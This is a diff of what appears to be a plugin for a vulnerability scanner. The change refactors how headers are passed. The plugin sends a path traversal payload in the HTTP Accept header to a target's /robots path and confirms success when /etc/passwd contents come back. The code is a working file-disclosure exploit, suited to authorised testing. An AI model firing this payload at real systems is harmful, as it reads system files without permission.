@@ -30,7 +30,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=ClassCongregation.Proxies().result(proxies)
 
     scheme, url, port = UrlProcessing(Url)
@@ -43,16 +43,13 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
     try:
         payload = "../../../../../../../../etc/passwd{{"
         payload_url = scheme + "://" + url +":"+ str(port) + "/robots"
-        headers = {
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept': payload,
-            'Accept-Language': 'en',
-            'User-Agent': RandomAgent,
-            'Content-Type': 'application/x-www-form-urlencoded',
-        }
+
+        Headers['Accept']=payload
+        Headers['Content-Type']='application/x-www-form-urlencoded'
+
 
         s = requests.session()
-        resp = s.get(payload_url, headers=headers,timeout=5, proxies=proxies,verify=False)
+        resp = s.get(payload_url, headers=Headers,timeout=5, proxies=proxies,verify=False)
         con=resp.text
         code = resp.status_code
         if code== 200 and con.find('root:') != -1 and con.find('bin:') != -1 and con.find('sys:') != -1 and con.find('sync:') != -1 :
